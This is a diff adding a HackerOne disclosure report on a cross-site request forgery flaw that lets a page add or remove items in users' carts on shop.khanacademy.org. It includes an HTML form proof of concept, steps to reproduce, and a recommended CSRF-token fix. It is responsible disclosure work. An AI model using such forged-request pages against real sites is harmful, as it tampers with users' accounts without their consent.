@@ -1,0 +1,46 @@
+# HackerOne Report: CSRF - Adding/Removing items to cart - shop.khanacademy.org
+**Report ID:** 6378
+**Vulnerability Class:** Cross-Site Request Forgery (CSRF)
+
+## Vulnerability Information & PoC
+Hi there,
+
+I've discovered a possiblity to remove/add items to a users' cart at shop.khanacademy.org.
+
+###Details
+
+```
+- Host: shop.khanacademy.org
+- URL: http://shop.khanacademy.org/cart
+- Affected parameters: updates[PRODUCTID]
+```
+
+
+###Steps to reproduce
+- 1. Visit http://shop.khanacademy.org/cart and empty your cart
+- 2. Run the following CSRF PoC:
+
+```
+<html>
+  <body>
+    <form action="http://shop.khanacademy.org/cart" method="POST">
+      <input type="hidden" name="updates&#91;211669705&#93;" value="1" />
+      <input type="hidden" name="update" value="Update&#32;quantities" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
+
+- 3. Take a look into your cart again
+- 4. There should be a new item. 
+
+An attacker can set the quantity to zero to remove an item or increase / add new items to the cart. 
+
+###How to fix?
+You should add a CSRF token to the form. 
+
+Best regards,
+Sebastian Neef
+
+## Discussion & Remediation Timeline
